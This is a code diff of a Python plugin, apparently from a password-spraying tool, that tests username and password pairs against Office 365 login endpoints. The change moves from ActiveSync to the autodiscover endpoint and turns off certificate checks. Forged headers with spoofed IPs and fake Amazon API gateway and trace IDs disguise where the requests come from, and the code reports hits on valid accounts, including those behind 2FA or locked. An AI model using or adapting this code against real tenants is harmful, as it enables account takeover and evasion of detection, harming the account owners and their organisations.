@@ -1,4 +1,5 @@
 import json, datetime, requests, random
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 
 def generate_ip():
@@ -41,26 +42,9 @@ def o365_authenticate(url, username, password, useragent, pluginargs):
         'output' : ""
     }
 
-    INVALID_LOGIN = "INVALID_LOGIN"
-    INVALID_USER = "INVALID_USER"
-    VALID_PASSWD_2FA = "VALID_PASSWD_2FA"
-    VALID_LOGIN = "VALID_LOGIN"
-    UNKNOWN = "UNKNOWN"
-
-    symbols = {
-        INVALID_LOGIN: "-",
-        INVALID_USER: "-",
-        VALID_PASSWD_2FA: "#",
-        VALID_LOGIN: "!",
-        UNKNOWN: "?"
-    }
-    template = "[{s}] {code} {valid} {user}:{password}"
-
-
     spoofed_ip = generate_ip()
     amazon_id = generate_id()
     trace_id = generate_trace_id()
-
 
     headers = {
         'User-Agent': useragent,
@@ -68,31 +52,22 @@ def o365_authenticate(url, username, password, useragent, pluginargs):
         "x-amzn-apigateway-api-id" : amazon_id,
         "X-My-X-Amzn-Trace-Id" : trace_id,
 
-        "MS-ASProtocolVersion": "14.0"
+        "Content-Type": "text/xml"
     }
 
     try:
-        r = requests.options("{}/Microsoft-Server-ActiveSync".format(url), auth=(username, password), headers=headers, timeout=30)
+        r = requests.get("{}/autodiscover/autodiscover.xml".format(url), auth=(username, password), headers=headers, verify=False, timeout=30)
 
-        status = r.status_code
-        valid = ""
-
-        if status == 401:
-            valid = INVALID_LOGIN
-            data_response['success'] = False
-        elif status == 404:
-            if r.headers.get("X-CasErrorCode") == "UserNotFound":
-                valid = INVALID_USER
-            data_response['success'] = False
-        elif status == 403:
-            valid = VALID_PASSWD_2FA
+        if r.status_code == 200:
+            data_response['output'] = "SUCCESS: {username}:{password}".format(username=username,password=password)
             data_response['success'] = True
-            data_response['2fa_enabled'] = True
-        elif status == 200:
-            valid = VALID_LOGIN
+        elif r.status_code == 456:
+            data_response['output'] = "SUCCESS: {username}:{password} - 2FA or Locked".format(username=username,password=password)
             data_response['success'] = True
+        else:
+            data_response['output'] = "FAILED: {username}:{password}".format(username=username,password=password)
+            data_response['success'] = False
 
-        data_response['output'] = template.format(s=symbols[valid], code=status, valid=valid, user=username, password=password)
 
     except Exception as ex:
         data_response['error'] = True
